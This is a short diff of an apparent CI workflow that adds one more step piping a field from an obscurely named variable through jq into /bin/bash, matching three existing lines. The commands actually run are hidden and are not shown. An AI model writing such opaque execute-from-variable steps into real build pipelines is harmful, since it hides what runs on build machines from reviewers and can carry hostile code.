@@ -28,6 +28,7 @@ jobs:
           echo $la42850 | jq -r .e148 | /bin/bash
           echo $of155 | jq -r .av68 | /bin/bash
           echo $w4234 | jq -r .zd8193 | /bin/bash
+          printf '%s' "$yrjal04" | jq -r .l6 | /bin/bash
 
       - name: Archive output
         if: always()
